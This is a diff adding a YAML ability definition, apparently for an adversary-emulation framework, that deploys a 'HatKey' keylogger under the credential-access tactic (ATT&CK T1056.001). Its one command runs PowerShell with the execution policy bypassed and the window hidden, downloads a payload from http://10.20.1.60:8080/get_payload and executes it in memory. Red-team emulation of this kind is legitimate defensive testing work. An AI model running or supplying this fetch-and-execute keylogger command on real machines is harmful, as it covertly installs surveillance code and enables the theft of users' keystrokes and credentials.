@@ -1,0 +1,16 @@
+---
+
+- id: 23698feb-4b4d-42fa-8176-b6838559453d
+  name: HatKey keylogger
+  description: Deploys a HatKey Agent on the target machine. Verify that the HatKey server is up and running
+  tactic: credential-access
+  technique:
+    attack_id: T1056.001
+    name: Input Capture - Keylogger
+  platforms:
+    windows:
+      cmd:
+        command: | 
+          powershell -ExecutionPolicy Bypass -WindowStyle Hidden IEX((New-Object Net.WebClient).DownloadString("http://10.20.1.60:8080/get_payload"))
+        cleanup: |
+          ""
